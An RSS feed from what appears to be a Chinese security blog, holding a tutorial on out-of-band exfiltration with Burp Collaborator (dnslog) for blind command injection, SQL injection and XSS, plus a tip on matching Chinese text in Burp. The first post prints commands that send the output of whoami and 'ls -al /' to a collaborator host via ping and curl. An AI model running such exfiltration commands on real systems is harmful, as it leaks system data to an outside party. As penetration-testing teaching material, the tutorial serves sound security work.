<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Burpsuite on runshell</title>
    <link>http://localhost:1313/tags/burpsuite/</link>
    <description>Recent content in Burpsuite on runshell</description>
    <generator>Hugo</generator>
    <language>zh-CN</language>
    <lastBuildDate>Sun, 15 Jul 2018 14:30:00 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/burpsuite/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Burp suite中的dnslog</title>
      <link>http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</link>
      <pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate>
      <guid>http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</guid>
      <description>&lt;p&gt;[注]本文提到的burp均为付费专业版，免费社区版不具有该功能。&lt;/p&gt;&#xA;&lt;h2 id=&#34;0x00-什么是dnslog&#34;&gt;0x00 什么是dnslog&lt;/h2&gt;&#xA;&lt;p&gt;dnslog，顾名思义，就是dns服务产生的日志。有什么用呢？我们可以用子域名来携带出信息。&lt;/p&gt;&#xA;&lt;p&gt;这种套路主要用于渗透测试中的盲打。执行系统命令没有回显的时候，sql盲注的时候，xss想将cookie带出来的时候……将你想得到的信息放在自己的域名前面作为子域名，dns服务器解析该域名时产生的日志中将会包含整个域名。如果携带的信息太长，可能dns就携带不了了，好在通常dnslog平台同时也提供http日志，可以使用http请求携带更多信息。&lt;/p&gt;&#xA;&lt;h2 id=&#34;0x01-burp-suite中的dnslog功能&#34;&gt;0x01 burp suite中的dnslog功能&lt;/h2&gt;&#xA;&lt;p&gt;&lt;strong&gt;Collaborator client&lt;/strong&gt; ，相比Burp中的&lt;code&gt;proxy&lt;/code&gt;、&lt;code&gt;instruder&lt;/code&gt;、&lt;code&gt;scanner&lt;/code&gt;等功能，这个功能可能鲜为人知了吧！启动位置如下图，&lt;code&gt;Butp&lt;/code&gt;→&lt;code&gt;Burp Collaborator client&lt;/code&gt;。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/1536408720503.png&#34; alt=&#34;Collaborator&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;启动Collaborator client后显示如下页面，burp会分配给我们一个三级域名，点击&lt;code&gt;Copy to clipbord&lt;/code&gt;可以将域名复制到粘贴板，如&lt;code&gt;p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net&lt;/code&gt; 。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/1536409490993.png&#34; alt=&#34;1536409490993&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;下面举个简单的例子，在Linux shell中执行如下命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ping &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;whoami&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;.p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;点击Collaborator client窗口中的Poll now获取dnslog，如下图，在log条目区域显示两条日志，在下面的日志详情中我们看到了从子域名中携带出了&lt;code&gt;whoami&lt;/code&gt;的执行结果。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/1536409951024.png&#34; alt=&#34;1536409951024&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;如果想执行ls查看根目录有哪些文件，用dns携带不了那么多信息，转而使用http请求，执行如下命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;`ls -al /`&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再次点击Collaborator client窗口中的Poll now获取log，我们可以在log区看到一条http日志，我们查看请求原始信息可以看到请求体中携带出了&lt;code&gt;ls -al /&lt;/code&gt;的执行结果。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/1536410609261.png&#34; alt=&#34;1536410609261&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;有没有觉得明文携带这些信息太不安全了？可是使用https安全传送，例如：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl https://p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;`ls -al /`&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后的结果和使用http一样。burp的dnslog功能也是相当全的。&lt;/p&gt;&#xA;&lt;h2 id=&#34;0x02-私有的collaborator-server&#34;&gt;0x02 私有的Collaborator server&lt;/h2&gt;&#xA;&lt;p&gt;上面举例的是使用burp的公共Collaborator server，有时我们需要使用私有的Collaborator server。使用公共的Collaborator server，但是，信息存储在别人的服务器上是没有保密性可言的。还有一种情况，就是需要渗透的目标在内网且不与外网互通的情况下，就得使用私有的Collaborator server。&lt;/p&gt;&#xA;&lt;p&gt;下面我们来看看如何搭建私有的Collaborator server。burp提供了搭建Collaborator server的功能，在服务器上执行&lt;code&gt;sudo java -jar burp.jar --collaborator-server&lt;/code&gt; 即带&lt;code&gt;--collaborator-server&lt;/code&gt;参数运行burp即可启动服务。&lt;/p&gt;&#xA;&lt;p&gt;然后在客户端配置，以此打开&lt;code&gt;Project options&lt;/code&gt;→&lt;code&gt;Misc&lt;/code&gt;→&lt;code&gt;Burp Collaborator server&lt;/code&gt; ，选择&lt;code&gt;Use a private Collaborator server&lt;/code&gt; ，在&lt;code&gt;Server location&lt;/code&gt;中设置服务器域名，没有域名的情况下可以使用IP，如果按IP地址指定服务器，则无法使用依赖于DNS解析的Burp与Collaborator相关的功能。 另外，默认情况下，Burp通过HTTPS轮询Collaborator服务器，并强制实施SSL信任以防止中间人攻击。如果您的Burp实例由于网络或其他限制而无法通过HTTPS直接轮询，您可以选择轮询未加密的HTTP。由于没有配置ssl证书，所以此处勾选&lt;code&gt;Poll over unencrypted HTTP&lt;/code&gt;即使用未加密的http轮询。详情如下图：&lt;/p&gt;</description>
    </item>
    <item>
      <title>Burp中匹配中文</title>
      <link>http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</link>
      <pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate>
      <guid>http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</guid>
      <description>&lt;p&gt;**问题：**Burp中有很多地方可以进行正则匹配，比如Instruder模块中筛选响应包，proxy模块中匹并配替换字符串。中文在匹配的时候，添加进匹配列表就变身了，关键是与数据包内的相应字符不能匹配。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;解决办法：&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;在user option中设置字符集(character sets)为显示原始字节流(Display as raw bytes);&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;img src=&#34;..//images/image1.png&#34; alt=&#34;image1&#34;&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;在响应包中复制要匹配的中文，显示的是乱码；&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;img src=&#34;..//images/image2.png&#34; alt=&#34;image2&#34;&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;将复制的乱码粘贴到添加匹配字符串的地方。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;img src=&#34;..//images/image3.png&#34; alt=&#34;image3&#34;&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
